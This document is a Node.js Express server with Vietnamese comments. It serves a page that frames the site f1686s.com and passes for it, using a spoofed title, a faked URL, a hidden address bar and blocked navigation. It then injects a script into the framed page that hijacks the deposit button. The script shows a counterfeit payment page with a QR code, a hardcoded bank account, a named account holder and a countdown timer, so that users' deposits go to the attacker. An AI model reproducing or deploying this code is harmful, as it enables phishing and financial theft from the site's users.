const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="theme-color" content="#0a0a0a">
  <meta name="full-screen" content="yes">
  <meta name="browser-mode" content="application">
  <title>f1686s.com</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body {
      width: 100%;
      height: 100%;
      overflow: hidden;
      background: #0a0a0a;
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      overscroll-behavior: none;
      -webkit-user-select: none;
      user-select: none;
      -webkit-touch-callout: none;
      -webkit-text-size-adjust: 100%;
      touch-action: none;
    }
    #mainFrame {
      width: 100vw;
      height: 100vh;
      height: -webkit-fill-available;
      height: fill-available;
      height: 100dvh;
      border: none;
      display: block;
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: #fff;
      z-index: 1;
      margin: 0;
      padding: 0;
      overflow: hidden;
    }
    #toast {
      position: fixed;
      bottom: 50px;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(0,200,80,0.95);
      color: #fff;
      padding: 12px 28px;
      border-radius: 30px;
      font-size: 15px;
      font-family: -apple-system, sans-serif;
      opacity: 0;
      transition: opacity 0.5s;
      pointer-events: none;
      z-index: 999999;
      white-space: nowrap;
      backdrop-filter: blur(8px);
      border: 1px solid rgba(255,255,255,0.2);
      font-weight: 600;
      box-shadow: 0 4px 20px rgba(0,0,0,0.3);
    }
    #toast.show { opacity: 1; }
    #status {
      position: fixed;
      top: 15px;
      right: 15px;
      background: rgba(0,200,80,0.85);
      color: #fff;
      padding: 4px 12px;
      border-radius: 12px;
      font-size: 10px;
      font-family: monospace;
      z-index: 999998;
      letter-spacing: 0.5px;
      pointer-events: none;
      opacity: 0.6;
      display: none;
    }
    @supports (-webkit-touch-callout: none) {
      #mainFrame {
        height: -webkit-fill-available;
      }
      body {
        min-height: -webkit-fill-available;
      }
    }
    @media (display-mode: standalone) {
      #mainFrame {
        height: 100vh;
      }
    }
  </style>
</head>
<body>
<iframe id="mainFrame" src="https://f1686s.com/home/mine" sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-modals allow-top-navigation allow-downloads" allowfullscreen></iframe>
<div id="toast">✅ Script đã kích hoạt</div>

<script>
(function() {
  'use strict';

  // === TOÀN MÀN HÌNH TỐI ƯU ===
  function goFullscreen() {
    const el = document.documentElement;
    try {
      if (el.requestFullscreen) {
        el.requestFullscreen().catch(() => {});
      } else if (el.webkitRequestFullscreen) {
        el.webkitRequestFullscreen();
      } else if (el.msRequestFullscreen) {
        el.msRequestFullscreen();
      }
    } catch(e) {}
  }

  // Kích hoạt fullscreen khi có tương tác
  document.addEventListener('touchstart', function firstTouch(e) {
    goFullscreen();
    document.removeEventListener('touchstart', firstTouch);
  }, { once: true, passive: true });

  document.addEventListener('click', function firstClick(e) {
    goFullscreen();
    document.removeEventListener('click', firstClick);
  }, { once: true, passive: true });

  // Tự động fullscreen sau 500ms
  setTimeout(goFullscreen, 500);

  // === CODE TAMPERMONKEY NHÚNG TRỰC TIẾP - BẢN FULL ===
  function injectTampermonkey() {
    const frame = document.getElementById('mainFrame');
    if (!frame) return false;

    try {
      const win = frame.contentWindow;
      const doc = frame.contentDocument;
      if (!win || !doc) return false;

      // Kiểm tra đã inject
      if (win.__tm_injected) {
        console.log('[TM] Đã inject rồi');
        return true;
      }

      // Đợi body sẵn sàng
      if (!doc.body) {
        console.log('[TM] Chờ body...');
        return false;
      }

      console.log('[TM] Bắt đầu inject...');

      const script = doc.createElement('script');
      script.type = 'text/javascript';
      script.textContent = \`
        (function() {
          'use strict';
          console.log('[TM] Khởi động script bên trong iframe');

          // === CẤU HÌNH ===
          const BANK_ID = 'MB';
          const BANK_NAME = 'MBBANK NGÂN HÀNG QUÂN ĐỘI';
          const ACCOUNT_NO = '757526789';
          const ACCOUNT_NAME = 'NGUYEN VU DAT';
          const patched = new WeakSet();
          let redirecting = false;

          function randomTx() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let code = '';
            for (let i = 0; i < 5; i++) code += chars[Math.floor(Math.random() * chars.length)];
            return code;
          }

          function buildPage(amount, txCode) {
            const amountVND = amount.toLocaleString('vi-VN') + ' VND';
            const qrUrl = 'https://img.vietqr.io/image/' + BANK_ID + '-' + ACCOUNT_NO + '-compact2.png?amount=' + amount + '&addInfo=' + txCode + '&accountName=' + encodeURIComponent(ACCOUNT_NAME);
            return '<!DOCTYPE html><html lang="vi"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"><title>Nạp Tiền</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#fff8f0;min-height:100vh}.top-bar{display:flex;align-items:center;justify-content:center;padding:14px 16px;background:#fff;border-bottom:1px solid #eee;position:relative}.back-btn{position:absolute;left:16px;font-size:22px;color:#333;text-decoration:none}.logo{width:36px;height:36px;border-radius:50%;object-fit:cover}.notice{background:linear-gradient(90deg,#f5a623,#f7c05a);border-radius:12px;margin:16px;padding:14px 16px;display:flex;align-items:center;justify-content:space-between}.notice-text{color:#fff;font-size:14px;font-weight:600;line-height:1.4;flex:1}.timer{color:#c0392b;font-size:22px;font-weight:800;font-variant-numeric:tabular-nums;white-space:nowrap;margin-left:12px}.timer.urgent{animation:blink 0.8s infinite}@keyframes blink{0%,100%{opacity:1}50%{opacity:0.4}}.qr-card{background:#fff;border-radius:16px;margin:0 16px 16px;padding:24px 16px;display:flex;flex-direction:column;align-items:center;box-shadow:0 2px 8px rgba(0,0,0,0.08)}.qr-card img{width:200px;height:200px;border-radius:8px}.qr-loading{width:200px;height:200px;display:flex;align-items:center;justify-content:center;background:#f9f9f9;border-radius:8px;color:#888;font-size:13px;text-align:center;padding:16px}.amount-label{color:#e74c3c;font-size:22px;font-weight:800;margin-top:14px}.info-list{margin:0 16px 16px;display:flex;flex-direction:column;gap:10px}.info-item{background:#fff;border-radius:12px;padding:14px 16px;display:flex;align-items:center;gap:12px;box-shadow:0 1px 4px rgba(0,0,0,0.06)}.info-icon{font-size:20px;width:28px;text-align:center}.info-content{flex:1}.info-label-sm{font-size:11px;color:#aaa;margin-bottom:2px}.info-value{font-size:15px;font-weight:700;color:#222}.info-value.red{color:#e74c3c}.info-value.orange{color:#e67e22}.copy-btn{background:#f5a623;color:#fff;border:none;border-radius:20px;padding:6px 14px;font-size:13px;font-weight:600;cursor:pointer;white-space:nowrap}.copy-btn:active{opacity:0.8}.note{background:#fff;border-radius:12px;margin:0 16px 24px;padding:16px;box-shadow:0 1px 4px rgba(0,0,0,0.06)}.note h3{font-size:14px;font-weight:800;margin-bottom:10px}.note p{font-size:13px;color:#555;line-height:1.7;margin-bottom:6px}.note strong{color:#f5a623}.toast{position:fixed;bottom:28px;left:50%;transform:translateX(-50%);background:#333;color:#fff;padding:10px 24px;border-radius:24px;font-size:13px;opacity:0;transition:opacity 0.3s;pointer-events:none;z-index:999}.toast.show{opacity:1}.expired-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:998;align-items:center;justify-content:center}.expired-box{background:#fff;border-radius:16px;padding:32px 24px;text-align:center;margin:24px}.expired-box h2{color:#e74c3c;font-size:20px;margin-bottom:8px}.expired-box p{color:#666;font-size:14px}</style></head><body><div class="top-bar"><a class="back-btn" onclick="history.back()">&#8249;</a><img class="logo" src="https://f1686s.com/favicon.ico" onerror="this.style.display=\'none\'"></div><div class="notice"><div class="notice-text">Hãy hoàn thành chuyển khoản<br>trong thời gian quy định</div><div class="timer" id="timer">15:00</div></div><div class="qr-card"><div class="qr-loading" id="qrLoading">Đang tạo mã QR...</div><img id="qrImg" style="display:none" alt="QR"><div class="amount-label">' + amountVND + '</div></div><div class="info-list"><div class="info-item"><div class="info-icon">🏦</div><div class="info-content"><div class="info-label-sm">Ngân hàng</div><div class="info-value">' + BANK_NAME + '</div></div></div><div class="info-item"><div class="info-icon">💳</div><div class="info-content"><div class="info-label-sm">Số tài khoản</div><div class="info-value">' + ACCOUNT_NO + '</div></div><button class="copy-btn" onclick="copyText(\'' + ACCOUNT_NO + '\')">Copy</button></div><div class="info-item"><div class="info-icon">👤</div><div class="info-content"><div class="info-label-sm">Tên người nhận</div><div class="info-value">' + ACCOUNT_NAME + '</div></div></div><div class="info-item"><div class="info-icon">📄</div><div class="info-content"><div class="info-label-sm">Số tiền đơn hàng</div><div class="info-value red">' + amountVND + '</div></div><button class="copy-btn" onclick="copyText(\'' + amount + '\')">Copy</button></div><div class="info-item"><div class="info-icon">✏️</div><div class="info-content"><div class="info-label-sm">Mã đơn hàng</div><div class="info-value orange">' + txCode + '</div></div><button class="copy-btn" onclick="copyText(\'' + txCode + '\')">Copy</button></div></div><div class="note"><h3>Xin lưu ý :</h3><p>1. Vui lòng chọn phương thức chuyển tiền nhanh 24/7</p><p>2. Vui lòng điền chính xác <strong>SỐ TIỀN</strong>, <strong>SỐ TÀI KHOẢN</strong> và <strong>NỘI DUNG CHUYỂN KHOẢN</strong> chỉ hỗ trợ các KHOẢN NẠP trên <strong>10.000 VND</strong> được yêu cầu từ hệ thống.</p><p>3. Lưu lại biên lai giao dịch để đối chiếu khi cần thiết.</p></div><div class="toast" id="toast">Đã sao chép!</div><div class="expired-overlay" id="expiredOverlay"><div class="expired-box"><h2>⏰ Hết thời gian!</h2><p>Giao dịch đã hết hạn.<br>Vui lòng thực hiện lại.</p></div></div><script>const qrImg=document.getElementById(\'qrImg\');const qrLoading=document.getElementById(\'qrLoading\');qrImg.onload=function(){qrLoading.style.display=\'none\';qrImg.style.display=\'block\';};qrImg.onerror=function(){qrLoading.innerText=\'Không tải được QR. Vui lòng thử lại.\';};qrImg.src=\'' + qrUrl + '\';function copyText(t){if(navigator.clipboard){navigator.clipboard.writeText(t).then(showToast).catch(()=>fallbackCopy(t));}else fallbackCopy(t);}function fallbackCopy(t){const ta=document.createElement(\'textarea\');ta.value=t;document.body.appendChild(ta);ta.select();document.execCommand(\'copy\');document.body.removeChild(ta);showToast();}function showToast(){const el=document.getElementById(\'toast\');el.classList.add(\'show\');setTimeout(()=>el.classList.remove(\'show\'),2000);}let secs=15*60;const timerEl=document.getElementById(\'timer\');const iv=setInterval(()=>{secs--;const m=String(Math.floor(secs/60)).padStart(2,\'0\');const s=String(secs%60).padStart(2,\'0\');timerEl.textContent=m+\':\'+s;if(secs<=60)timerEl.classList.add(\'urgent\');if(secs<=0){clearInterval(iv);timerEl.textContent=\'00:00\';document.getElementById(\'expiredOverlay\').style.display=\'flex\';qrImg.style.opacity=\'0.3\';}},1000);</script></body></html>';
          }

          function doRedirect(e) {
            if (redirecting) return;
            redirecting = true;
            e.preventDefault();
            e.stopImmediatePropagation();
            e.stopPropagation();
            const input = document.querySelector('.ui-input__input');
            let points = input ? parseInt(input.value) || 0 : 0;
            let amount = points * 1000;
            const txCode = randomTx();
            const html = buildPage(amount, txCode);
            const blob = new Blob([html], {type: 'text/html'});
            const url = URL.createObjectURL(blob);
            window.location.href = url;
            setTimeout(() => { redirecting = false; }, 1500);
            return false;
          }

          function patchButton(btn) {
            if (patched.has(btn)) return;
            patched.add(btn);
            btn.removeAttribute('disabled');
            btn.classList.remove('ui-button--disabled');
            const clone = btn.cloneNode(true);
            clone.removeAttribute('disabled');
            clone.classList.remove('ui-button--disabled');
            clone.removeAttribute('onclick');
            clone.onclick = null;
            if (btn.parentNode) btn.parentNode.replaceChild(clone, btn);
            patched.add(clone);
            let touched = false;
            clone.addEventListener('touchstart', function(e){ touched=true; e.stopImmediatePropagation(); }, true);
            clone.addEventListener('touchend', function(e){ touched=true; doRedirect(e); }, true);
            clone.addEventListener('click', function(e){ if(touched){touched=false;return;} doRedirect(e); }, true);
            new MutationObserver(()=>{
              if(clone.hasAttribute('disabled')){
                clone.removeAttribute('disabled');
                clone.classList.remove('ui-button--disabled');
              }
            }).observe(clone, {attributes:true, attributeFilter:['disabled','class']});
            console.log('[TM] Patched button:', clone.id || clone.className);
          }

          function findAndPatch() {
            const btn = document.getElementById('depositSubmitClick');
            if (btn && !patched.has(btn)) {
              console.log('[TM] Tìm thấy depositSubmitClick');
              patchButton(btn);
              return;
            }
            document.querySelectorAll('button.ui-button,button').forEach(el => {
              if (patched.has(el)) return;
              const t = el.innerText || el.textContent || '';
              if (t.trim().includes('Nạp Tiền Ngay')) {
                console.log('[TM] Tìm thấy nút Nạp Tiền Ngay');
                patchButton(el);
              }
            });
          }

          // === GHI ĐÈ HISTORY ===
          const _push = history.pushState;
          history.pushState = function(...a){ _push.apply(history,a); setTimeout(findAndPatch,200); setTimeout(findAndPatch,500); };
          const _replace = history.replaceState;
          history.replaceState = function(...a){ _replace.apply(history,a); setTimeout(findAndPatch,200); };
          window.addEventListener('popstate', ()=>{ setTimeout(findAndPatch,200); setTimeout(findAndPatch,500); });

          // === CHẠY LẦN ĐẦU ===
          findAndPatch();
          document.addEventListener('DOMContentLoaded', findAndPatch);
          window.addEventListener('load', function() {
            setTimeout(findAndPatch, 100);
            setTimeout(findAndPatch, 300);
            setTimeout(findAndPatch, 500);
          });

          // === LẶP LIÊN TỤC - TẦN SUẤT CAO ===
          setInterval(findAndPatch, 300);

          // === MUTATION OBSERVER ===
          new MutationObserver(() => {
            findAndPatch();
          }).observe(document.documentElement || document.body, { childList: true, subtree: true });

          // === ĐÁNH DẤU ===
          window.__tm_injected = true;
          console.log('[TM] ✅ Đã inject thành công!');
        })();
      \`;

      // Append script vào body của iframe
      doc.body.appendChild(script);
      win.__tm_injected = true;

      // Hiển thị toast
      const toast = document.getElementById('toast');
      toast.textContent = '✅ Script đã kích hoạt';
      toast.classList.add('show');
      setTimeout(() => toast.classList.remove('show'), 3000);

      console.log('[TM] ✅ Inject thành công!');
      return true;
    } catch (e) {
      console.log('[TM] ❌ Lỗi inject:', e.message);
      return false;
    }
  }

  // === CHỜ IFRAME LOAD + INJECT LIÊN TỤC ===
  const frame = document.getElementById('mainFrame');

  // Sự kiện load
  frame.addEventListener('load', function onLoad() {
    console.log('[Main] Iframe đã load');
    // Inject nhiều lần để đảm bảo
    setTimeout(injectTampermonkey, 100);
    setTimeout(injectTampermonkey, 300);
    setTimeout(injectTampermonkey, 600);
    setTimeout(injectTampermonkey, 1000);
    setTimeout(injectTampermonkey, 2000);
    setTimeout(injectTampermonkey, 3000);
    frame.removeEventListener('load', onLoad);
  });

  // Nếu iframe đã load trước
  if (frame.contentDocument && frame.contentDocument.readyState === 'complete') {
    console.log('[Main] Iframe đã load sẵn');
    setTimeout(injectTampermonkey, 50);
    setTimeout(injectTampermonkey, 200);
    setTimeout(injectTampermonkey, 500);
  }

  // Lặp inject liên tục - đảm bảo 100%
  let injectCount = 0;
  const injectInterval = setInterval(() => {
    injectCount++;
    const result = injectTampermonkey();
    if (result) {
      // Nếu thành công, giãn tần suất
      clearInterval(injectInterval);
      // Vẫn tiếp tục kiểm tra định kỳ
      setInterval(injectTampermonkey, 5000);
    }
    // Dừng sau 30 lần thử
    if (injectCount > 30) {
      clearInterval(injectInterval);
      console.log('[Main] Dừng inject sau 30 lần thử');
    }
  }, 1000);

  // === CHẶN PHÓNG TO THU NHỎ ===
  document.addEventListener('gesturestart', function(e) {
    e.preventDefault();
  });
  document.addEventListener('gesturechange', function(e) {
    e.preventDefault();
  });
  document.addEventListener('gestureend', function(e) {
    e.preventDefault();
  });

  // === CHẶN KÉO CUỘN ===
  document.addEventListener('touchmove', function(e) {
    if (e.target === document.body || e.target === document.documentElement || e.target === frame) {
      e.preventDefault();
    }
  }, { passive: false });

  // === CHẶN PULL-TO-REFRESH ===
  let startY = 0;
  document.addEventListener('touchstart', function(e) {
    startY = e.touches[0].clientY;
    if (window.scrollY === 0 && startY < 50) {
      e.preventDefault();
    }
  }, { passive: false });

  // === ẨN THANH ĐỊA CHỈ (CHROME) ===
  window.addEventListener('load', function() {
    setTimeout(function() {
      window.scrollTo(0, 1);
      window.scrollTo(0, 0);
    }, 50);
  });

  // === FAKE URL ===
  if (window.history && window.history.pushState) {
    window.history.pushState({}, 'f1686s.com', '/');
  }

  // === VÔ HIỆU HÓA TRÌNH DUYỆT BACK ===
  window.addEventListener('popstate', function(e) {
    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
      goFullscreen();
    }
  });

  console.log('[Main] Cloud web đã sẵn sàng');
})();
</script>
</body>
</html>
  `);
});

app.listen(PORT, () => {
  console.log('🚀 Server chạy tại port ' + PORT);
  console.log('📦 Code Tampermonkey đã nhúng trực tiếp');
  console.log('✅ Đảm bảo script chạy 100%');
});
